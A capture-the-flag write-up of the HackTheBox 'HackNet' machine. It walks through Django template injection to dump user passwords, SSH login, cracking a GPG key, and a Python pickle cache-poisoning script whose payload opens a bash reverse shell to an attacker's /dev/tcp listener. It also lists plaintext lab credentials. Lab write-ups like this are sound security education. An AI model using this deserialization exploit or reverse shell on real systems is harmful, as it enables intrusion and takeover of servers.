<center>
  
<h1>Machine - HackNet (Medium)</h1>

</center>

<img width="876" height="529" alt="image" src="https://github.com/user-attachments/assets/680211e7-daae-4b64-a1ae-a74373641dcb" />

Hello everyone, today I am writing a write-up for the HackNet machine on HackTheBox. It featured a Django based web application vulnerable to Server-Side Template Injection which later allowed for information disclosure through which we got shell access.<br><br>

Initial nmap Scan:
<pre><code class="language-none">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-17 17:32 CET
Nmap scan report for 10.129.3.27
Host is up (0.016s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds
</code></pre>
<br>
We have only HTTP and SSH ports open. After visiting the web app via the virtual host <i>hacknet.htb</i>, this is what we see: 
<br>
<img width="748" height="377" alt="image" src="https://github.com/user-attachments/assets/85459d7f-7adf-4323-af98-6754c8038a5f" />
<br>
I created a new account and started testing various parameters on the social media platform. After quite some time, I struck luck with the username field. I found that it gets reflected in the response of the <code><b>GET</b> /like/{POST_ID}</code> endpoint, which was vulnerable to SSTI (although it's very limited). The request is triggered when you click to see who liked certain post.<br>
<img width="1364" height="222" alt="image" src="https://github.com/user-attachments/assets/075bcd2d-3645-4e99-a4e4-2081d49f9440" /> <br>
Here, it wasn't the classic case of Jinja2 Template, it was Djangos Own Template Lanaguage, which is very limited of what we can actually do. After quite some time, I found the global <i>users</i> QuerySet Object via this simple payload:
<pre><code class="language-none">{% raw %}{{ users }}{% endraw %}</code></pre>
Response:
<pre><code class="language-html">&lt;!-- ...PROFILES FROM OTHER USERS -->
  &lt;div class="likes-review-item">
    &lt;a href="/profile/27">
        &lt;img src="/media/profile.png" title="&lt;QuerySet [&lt;SocialUser: hexhunter&gt;, &lt;SocialUser: shadowcaster&gt;, &lt;SocialUser: blackhat_wolf&gt;, &lt;SocialUser: glitch&gt;, &lt;SocialUser: codebreaker&gt;, &lt;SocialUser: shadowmancer&gt;, &lt;SocialUser: whitehat&gt;, &lt;SocialUser: brute_force&gt;, &lt;SocialUser: shadowwalker&gt;, &lt;SocialUser: {{ users }}&gt;]&gt;">
    &lt;/a>
&lt;/div></code></pre>
<br>

We can now traverse the users QuerySet to extract data for every single user, including their password, name, and email (e.g. <code class="language-none">{% raw %}{{ users.0.password }}{% endraw %}</code>). The goal here is to find the admin's secret account, because we can't interact on posts he didn't interact with and grab credentials that will get us SSH access. What we need to do is, iterate through the user indexes in our payload, trigger the SSTI by liking a post, and extract the data from the response (Essentially: Iterate through all users on your payload -> <code><b>GET</b> /like/{POST_ID}</code> -> <code><b>GET</b> /likes/{POST_ID}</code>).
<br> <br>
List of the users, <i>mikey</i> is the secret one.
<pre><code class="language-none">glitch:Gl1tchH@ckz
phreaker:Phre@k3rH@ck
rootbreaker:R00tBr3@ker#
shadowcaster:Sh@d0wC@st!
shadowwalker:Sh@dowW@lk2024
hexhunter:H3xHunt3r!
zero_day:Zer0D@yH@ck
trojanhorse:Tr0j@nH0rse!
ringo:password
cyberghost:Gh0stH@cker2024
virus_viper:V!rusV!p3r2024
netninja:N3tN1nj@2024
datadive:D@taD1v3r
test:Testest123#
codebreaker:C0d3Br3@k!
packetpirate:P@ck3tP!rat3
stealth_hawk:St3@lthH@wk
shadowmancer:Sh@d0wM@ncer
mikey:&lt;REDACTED>
bytebandit:Byt3B@nd!t123
blackhat_wolf:Bl@ckW0lfH@ck
darkseeker:D@rkSeek3r#
cryptoraven:CrYptoR@ven42
brute_force:BrUt3F0rc3#
exploit_wizard:Expl01tW!zard
deepdive:D33pD!v3r
whitehat:Wh!t3H@t2024
</code></pre>
<br>
We have the user flag:
<pre><code class="language-bash">$ ssh mikey@hacknet.htb
mikey@hacknet:~$ ls
user.txt
mikey@hacknet:~$ cat user.txt
&lt;REDACTED>
mikey@hacknet:~$ </code></pre>
<br>
<br>
Now onto Privilage Escalation to obtain the root flag. If we look at the web app directory, settings.py reveals there is a Django FileBasedCache configuration. It gets triggered when we visit the <i>/explore</i> page and saved to <i>/var/tmp/django_cache</i>.
<img width="751" height="164" alt="image" src="https://github.com/user-attachments/assets/b9bca247-2c56-42ce-80af-d1e5564f2f3f" />
<br>
When we check our permissions on the .djcache files (<i>/var/tmp/django_cache</i>), we can see we don't have <b>read</b> permission, but we have <b>write</b> permission actually.
<img width="875" height="116" alt="image" src="https://github.com/user-attachments/assets/5ab4be8f-c3fc-4804-b320-cd8b9c6146b0" />
<br>

Since we have write access to the directory, we can generate our own serialized payload and overwrite the existing cache file. This will grant us a shell as sandy (not root), as the web application is run by the user <i>sandy</i>. To exploit this, use the script below: replace the LHOST and LPORT with your Netcat listener's IP and port, run the exploit, and refresh the <b>/explore</b> page to spawn the shell.
<pre><code class="language-python">import os
import pickle

class Payload(object):
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'",))

b = pickle.dumps(Payload())

if os.path.exists("/var/tmp/django_cache"):
    for f in os.listdir("/var/tmp/django_cache"):
        if f.endswith(".djcache"):
            p = os.path.join("/var/tmp/django_cache", f)
            try:
                os.remove(p)
                with open(p, "wb") as o:
                    o.write(b)
            except:
                pass</code></pre>
<br>
If we navigate to home directory of sandy, we can find GPG backup key(armored_key.asc). We need the GPG private key to decrypt this backup, but the key itself is password protected. Sp what we need to do, we must export the key and crack its passphrase using tool like JohnTheRipper/Hashcat with <b>rockyou.txt</b> wordlist.  
<img width="905" height="156" alt="image" src="https://github.com/user-attachments/assets/4cd6349e-22d2-49bb-ba79-fa199656c2da" />
<br>
Now that we have the passphrase to read the backup files, we can navigate back to <i>/var/www/HackNet/backups</i> and read those 3 backup GPG files.
<pre><code class="language-none">$ gpg --decrypt backup02.sql.gpg > /tmp/backup02.sql</code></pre>
<br>
In <b>backup02.sql</b> we can grep for 'password', there are logs in which we find the root password. 
<pre><code class="language-none">$ su root
Password: &lt;REDACTED>
root@hacknet:~# ls
root.txt
root@hacknet:~# cat root.txt
&lt;REDACTED>
</code></pre>

<br>
<br>

# Thank you for reading this Writeup, appreciate it <3 and I’ll soon write more!
